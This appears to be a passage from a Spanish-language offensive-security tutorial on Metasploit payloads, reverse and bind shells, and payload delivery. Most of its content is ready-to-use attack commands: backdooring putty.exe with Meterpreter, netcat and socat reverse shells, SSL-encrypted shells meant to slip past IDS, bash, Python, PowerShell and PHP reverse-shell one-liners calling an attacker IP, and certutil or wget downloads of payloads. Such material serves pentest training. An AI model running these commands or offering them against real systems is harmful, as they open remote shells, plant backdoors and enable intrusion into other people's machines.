Un codificador (como `x86/shikata_ga_nai`) toma el código ejecutable de la carga útil y transforma sus bytes mediante operaciones matemáticas (como cifrado XOR polimórfico), anteponiendo un pequeño bloque de código decodificador (*Stub*).

Existe el concepto erróneo de que la codificación con `msfvenom` permite eludir las soluciones antivirus modernas. **La codificación NO es un mecanismo de evasión antivirus**. Los motores de seguridad modernos utilizan análisis heurístico, entornos aislados de ejecución (*Sandboxing*), la interfaz AMSI de Windows y modelos de aprendizaje automático que detectan la ejecución del stub decodificador en la memoria RAM independientemente de la codificación en disco.

La utilidad técnica legítima de los codificadores se limita a:
En primer lugar, sirve para **Eliminar caracteres prohibidos (*Bad Characters*):** Cuando un vector de ataque (como un desbordamiento de búfer en una función de cadena C) se corrompe si la carga útil contiene bytes nulos (` `), saltos de línea (`
`) o retornos de carro (`
`). La bandera `-b ' 

'` fuerza a `msfvenom` a codificar el binario omitiendo esos bytes.
En segundo lugar, permite el **Ajuste de formato:** Garantizar que la carga útil cumpla restricciones de conjunto de caracteres (por ejemplo, caracteres ASCII imprimibles).

### 4.5. Inyección en Binarios y Payloads Multiplataforma
Mediante la bandera `-x` es posible inyectar la carga útil dentro de un ejecutable legítimo existente (como `putty.exe`):

`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoor.exe`

La bandera `-k` instruye al codificador para que cree un hilo separado para la carga útil, permitiendo que la aplicación original (PuTTY) se ejecute e interactúe con el usuario con normalidad mientras la sesión de Meterpreter se abre en segundo plano.

Esta técnica presenta limitaciones en entornos reales: altera el hash de integridad del archivo, rompe la firma digital del software (provocando advertencias en Windows) y es detectada por reglas heurísticas de antivirus.

`msfvenom` admite la generación de cargas útiles para múltiples plataformas adicionales:
`Android (APK)`: Genera paquetes de instalación de aplicaciones Android (`.apk`).
`macOS (Mach-O)`: Genera binarios ejecutables nativos para sistemas Apple macOS.
`Aplicaciones Web Java (WAR)`: Genera paquetes `.war` desplegables en servidores Apache Tomcat, JBoss o GlassFish.
`Servidores IIS (.NET)`: Genera cargas útiles web en formato `ASP` o `ASPX`.

### 4.6. Controladores (Handlers) y Captura de Conexiones
Para capturar las conexiones salientes lanzadas por las cargas útiles generadas con `msfvenom`, se utiliza el controlador universal `exploit/multi/handler` desde `msfconsole`.

**La Regla de Oro de la Coincidencia:**
Para que el controlador capture la sesión con éxito, tres parámetros deben ser **exactamente idénticos** entre el comando de `msfvenom` y la configuración en `msfconsole`: el nombre de la carga útil (`PAYLOAD`), la dirección IP (`LHOST`) y el puerto (`LPORT`). Si se generó una carga útil sin etapas (`meterpreter_reverse_tcp`) pero se configura el controlador con una carga útil por etapas (`meterpreter/reverse_tcp`), la conexión fallará en silencio.

**Flujo de trabajo completo (Generar -> Escuchar -> Capturar):**
Como primer paso, se genera la carga útil en la terminal:
   `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o s.exe`
En segundo lugar, se configura el controlador en `msfconsole`:
   `use exploit/multi/handler`
   `set PAYLOAD windows/x64/meterpreter_reverse_tcp`
   `set LHOST 10.10.14.12`
   `set LPORT 4444`
   `run -j`
Como tercer paso, se transfiere y ejecuta el archivo `s.exe` en la máquina objetivo.
Finalmente, el controlador recibe la conexión saliente y notifica la apertura de la sesión de Meterpreter (`sessions -i 1`).

Opciones avanzadas del controlador:
`run -j`: Ejecuta el controlador como un trabajo en segundo plano para continuar usando la consola.
`set ExitOnSession false`: Mantiene el controlador en escucha activa continua para recibir múltiples sesiones consecutivas si el archivo se ejecuta en varias víctimas.
`set AutoRunScript post/windows/manage/migrate`: Ejecuta un comando o módulo automáticamente en cuanto se abra la sesión (por ejemplo, migrando el proceso a `explorer.exe`).

---

## 5. Fundamentos de Shells y Oyentes (Shells & Listeners Fundamentals)

### 5.1. Shells Inversas vs. Shells de Enlace (Reverse vs. Bind Shells)
Al establecer una consola de comandos remota, la dirección en la que se inicia la conexión de red es el factor determinante para el éxito del ataque:

**Shell Inversa (Reverse Shell):**
La máquina víctima comprometida es la que inicia la conexión saliente hacia la IP y puerto de la máquina del atacante, donde se encuentra un oyente en escucha. Es el método más utilizado en auditorías reales debido a que las políticas de seguridad de red y los cortafuegos casi siempre permiten el tráfico saliente desde la red interna (puertos 80, 443, 53) pero bloquean las conexiones entrantes no solicitadas. También permite tomar el control de máquinas situadas tras dispositivos NAT sin necesidad de reenvío de puertos.

**Shell de Enlace (Bind Shell):**
La máquina víctima abre un puerto de escucha en su propia interfaz de red y vincula un shell de comandos (`/bin/bash` o `cmd.exe`) a dicho puerto, quedando a la espera de que el atacante se conecte remotamente a ella. Este método es útil cuando la red de la víctima tiene reglas de filtrado saliente extremas que impiden cualquier conexión hacia el exterior, pero dispone de algún puerto de entrada permitido. Su principal desventaja es que el cortafuegos de la víctima suele bloquear los puertos de escucha entrantes no autorizados.

| Criterio de Selección | Reverse Shell (Shell Inversa) | Bind Shell (Shell de Enlace) |
| :--- | :--- | :--- |
| **Quien inicia la conexión** | La máquina víctima comprometida | La máquina del auditor / atacante |
| **Quien abre el puerto** | La máquina del auditor (Oyente) | La máquina víctima (Servidor) |
| **Comportamiento ante Cortafuegos** | Elude filtrados de entrada; aprovecha salida | Bloqueado por cortafuegos de entrada |
| **Entornos de Red Comunes** | Máquinas tras NAT, redes corporativas | Redes internas sin salidas a Internet |

### 5.2. Herramientas para Shells Remotas
Para capturar y gestionar consolas remotas se utilizan principalmente cuatro utilidades:
`Netcat (nc)`: La herramienta clásica y ligera de red. Funciona como una tubería transparente que redirige entradas y salidas a través de un socket TCP/UDP. Es universal y rápida, pero carece de cifrado y no admite manejo de teclas de dirección o autocompletado por defecto.
`Rlwrap`: Un envoltorio para la librería GNU Readline que se antepone a los comandos de Netcat para dotar al shell de historial de comandos, navegación con flechas y edición de texto.
`Socat`: Una herramienta de red avanzada capaz de asignar pseudoterminales (PTY) completos, gestionar señales de control (como `Ctrl + C`), enviar errores estándar y cifrar el tráfico mediante certificados SSL/TLS.
`Msfvenom & multi/handler`: La solución empresarial de Metasploit para gestionar cargas útiles avanzadas (como Meterpreter), soportar conexiones cifradas nativas y administrar múltiples sesiones concurrentes.

### 5.3. Uso Práctico de Netcat (`nc`)
**Iniciar un Oyente:**
Para poner Netcat a la escucha en la máquina atacante se ejecuta:

`nc -lvnp 4444`

Banderas empleadas: `-l` (modo escucha), `-v` (salida verbosa), `-n` (omitir resolución DNS para ganar velocidad) y `-p 4444` (especifica el puerto local). Se recomiendan puertos superiores al 1024 para no requerir privilegios de `root`.

**Establecer una Reverse Shell:**
En la máquina víctima se ejecuta el comando de conexión apuntando a la IP del atacante:

`nc 10.10.14.12 4444 -e /bin/bash`

*(Nota: En distribuciones Linux modernas como Ubuntu o Debian, la bandera `-e` de Netcat suele estar deshabilitada por razones de seguridad. En estos casos se recurre a tuberías nombradas en Bash o a Socat).*

**Conectarse a una Bind Shell:**
Si la víctima ha abierto un puerto de escucha (por ejemplo el puerto 7777), el atacante se conecta directamente escribiendo:

`nc IP_VICTIMA 7777`

### 5.4. Uso Práctico de Socat (`socat`)
Socat utiliza especificaciones de dirección donde los datos fluyen entre dos puntos finales. La sintaxis general es `socat opciones dirección1 dirección2`.

**Reverse Shell básica en Linux:**
Oyente en la máquina atacante:
`socat TCP-L:4444 -`

Ejecución en la víctima:
`socat TCP:10.10.14.12:4444 EXEC:/bin/bash`

**Reverse Shell en Windows:**
Oyente en la máquina atacante:
`socat TCP-L:4444 -`

Ejecución en la víctima Windows (usando tuberías de Windows):
`socat TCP:10.10.14.12:4444 EXEC:'cmd.exe',pipes` o `EXEC:'powershell.exe',pipes`

**Bind Shell básica:**
Ejecución en la víctima:
`socat TCP-L:7777 EXEC:/bin/bash`

Conexión desde el atacante:
`socat TCP:IP_VICTIMA:7777 -`

### 5.5. Estabilización de Shells (Shell Stabilisation)
Un shell retransmitido a través de un Netcat básico es frágil: pulsar `Ctrl + C` mata la sesión en lugar de cancelar un comando remoto, las flechas de dirección imprimen caracteres extraños (`^[[A`), la tecla Tabulación no autocompleta y editores como `vim` o `nano` no funcionan.

Existen tres técnicas estándar para elevar un shell básico a un pseudoterminal (TTY) plenamente interactivo:

#### Técnica 1: Elevación a TTY mediante Python
Para comenzar, se comprueban las dimensiones de la terminal local en la máquina atacante ejecutando `stty size` (por ejemplo, devuelve `24 80` o `38 116`).
Posteriormente, se obtiene la reverse shell inicial de Netcat.
Una vez en el shell remoto, se invoca el módulo `pty` de Python:
   `python3 -c 'import pty; pty.spawn("/bin/bash")'`
A continuación, se define la variable de entorno de terminal:
   `export TERM=xterm`
Tras esto, se envía el shell al segundo plano pulsando `Ctrl + Z`.
En la terminal local de la máquina atacante, se ajusta el modo de entrada de la consola para pasar caracteres en bruto sin eco local:
   `stty raw -echo; fg`
Al regresar al shell remoto mediante `fg`, se ajustan las filas y columnas según las dimensiones obtenidas previamente:
   `stty rows 38 cols 116`

*(Nota: Si la sesión se interrumpe de forma inesperada mientras el modo `raw` está activo, la terminal local parecerá no responder. Se soluciona a ciegas escribiendo `reset` y pulsando Enter, o ejecutando `stty sane`).*

#### Técnica 2: Uso del Envoltorio Readline (`rlwrap`)
Se antepone `rlwrap` al comando de escucha de Netcat en la máquina atacante:

`rlwrap nc -lvnp 4444`

Al recibir la conexión, se ejecuta `python3 -c 'import pty; pty.spawn("/bin/bash")'`, permitiendo de inmediato disponer de historial de comandos con las flechas del teclado y autocompletado mediante la tecla Tabulación.

#### Técnica 3: Shell TTY Totalmente Interactivo con Socat
Esta técnica proporciona la experiencia más estable posible (equivalente a una conexión SSH directa) asignando un pseudoterminal completo con gestión de señales de control de trabajo.

Primero, se monta un servidor web temporal en la máquina atacante para compartir el ejecutable binario estático de Socat:
   `python3 -m http.server 80`
Segundo, se descarga el binario en la víctima Linux y se le otorgan permisos de ejecución:
   `wget http://10.10.14.12/socat -O /tmp/socat && chmod +x /tmp/socat`
Tercero, se inicia el oyente PTY en la máquina atacante:
   `socat FILE:`tty`,raw,echo=0 TCP-L:4444`
Cuarto, se ejecuta el cliente Socat TTY en la víctima:
   `/tmp/socat TCP:10.10.14.12:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane`

### 5.6. Shells Cifradas (Encrypted Shells)
Las conexiones de shell en texto plano que circulan por puertos inusuales (como el 4444) son fácilmente identificables por sistemas IDS/IPS y cortafuegos con inspección profunda de paquetes (DPI). Al envolver el tráfico de shell en una capa de cifrado SSL/TLS, la comunicación se vuelve indistinguible del tráfico HTTPS legítimo.

**Paso 1: Generación del Certificado Autofirmado PEM**
En la máquina atacante se genera una clave privada RSA de 2048 bits y un certificado X.509 autofirmado válido por un año, combinando ambos elementos en un único archivo PEM:

`openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt && cat shell.key shell.crt > shell.pem`

**Paso 2: Oyente Cifrado con Socat**
Se inicia el oyente indicando el certificado creado y desactivando la verificación de cadena de confianza (`verify=0`):

`socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -`

**Paso 3: Reverse Shell Cifrada en la Víctima**
En la víctima Linux se establece la conexión SSL cifrada indicando el puerto 443:

`socat OPENSSL:10.10.14.12:443,verify=0 EXEC:/bin/bash`

**Reverse Shell Cifrada en Windows:**
En la víctima Windows se ejecuta pasando el intérprete de comandos con tuberías:

`socat OPENSSL:10.10.14.12:443,verify=0 EXEC:'cmd.exe',pipes`

**Reverse Shell Cifrada con TTY Completo:**
Oyente en la máquina atacante:
`socat FILE:`tty`,raw,echo=0 OPENSSL-LISTEN:443,cert=shell.pem,verify=0`

Cliente en la víctima Linux:
`/tmp/socat OPENSSL:10.10.14.12:443,verify=0 EXEC:"bash -li",pty,stderr,setsid,sigint,sane`

---

## 6. Generación y Entrega de Payloads de Shell (Shell Payload Generation & Delivery)

### 6.1. Cargas Útiles Comunes de Shell
Dependiendo de las tecnologías presentes en el servidor víctima, existen diferentes payloads y scripts estándar para desencadenar una reverse shell:

**Bash TCP Reverse Shell:**
`bash -i >& /dev/tcp/10.10.14.12/4444 0>&1`

**Python Reverse Shell (Linux/Windows):**
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

**PowerShell Reverse Shell (Windows):**
`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.12',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

**PHP Reverse Shell:**
`php -r '$sock=fsockopen("10.10.14.12",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

### 6.2. Estrategias de Transferencia y Entrega
Una vez generada la carga útil en la máquina atacante (ya sea un binario ELF, un ejecutable EXE o una web shell PHP), se deben emplear canales de transferencia eficientes para depositar el archivo en el objetivo:

**Servidor HTTP Integrado en Python:**
En la máquina atacante, desde el directorio donde reside el archivo generado:
`python3 -m http.server 80`

**Descarga en Linux:**
En la máquina víctima se utiliza `curl` o `wget`:
`wget http://10.10.14.12/payload.elf -O /tmp/payload.elf && chmod +x /tmp/payload.elf`
`curl http://10.10.14.12/payload.elf -o /tmp/payload.elf && chmod +x /tmp/payload.elf`

**Descarga en Windows:**
En la víctima Windows se recurre a PowerShell o `certutil`:
`powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.12/payload.exe' -OutFile 'C:\Windows\Tasks\payload.exe'"`
`certutil -urlcache -f http://10.10.14.12/payload.exe C:\Windows\Tasks\payload.exe`

**Transferencia mediante Codificación Base64:**
Cuando los canales de red directa están bloqueados o existen filtros de caracteres en la entrada, se puede codificar la carga útil en Base64 en la máquina atacante (`cat payload.exe | base64 -w 0`) y decodificarla directamente en la víctima en memoria o disco (`echo 'CADENA_BASE64' | base64 -d > /tmp/payload.elf`).

### 6.3. Automatización del Flujo de Explotación
Un proceso de explotación profesional debe seguir un flujo coordinado sin fisuras para evitar la pérdida de accesos iniciales:

Fase de **Planificación e Identificación:** Determinar el sistema operativo, arquitectura y restricciones de red del objetivo.
Fase de **Generación de la Carga Útil:** Seleccionar el payload exacto en `msfvenom` o preparar el script de shell correspondiente fijando los parámetros `LHOST` y `LPORT`.
Fase de **Puesta en Escucha del Oyente:** Iniciar el oyente adecuado (Netcat con `rlwrap`, Socat TTY/SSL o el módulo `exploit/multi/handler` en `msfconsole`) **antes** de activar el código malicioso.
Fase de **Entrega e Invocación:** Transferir la carga útil a la víctima mediante un servidor web Python, carga de archivos o inyección de comandos, y desencadenar su ejecución.
Fase de **Estabilización Inmediata:** Elevar la sesión capturada a un pseudoterminal TTY completo o migrar el proceso en Meterpreter a una ubicación estable del sistema para garantizar la persistencia del acceso durante toda la auditoría.
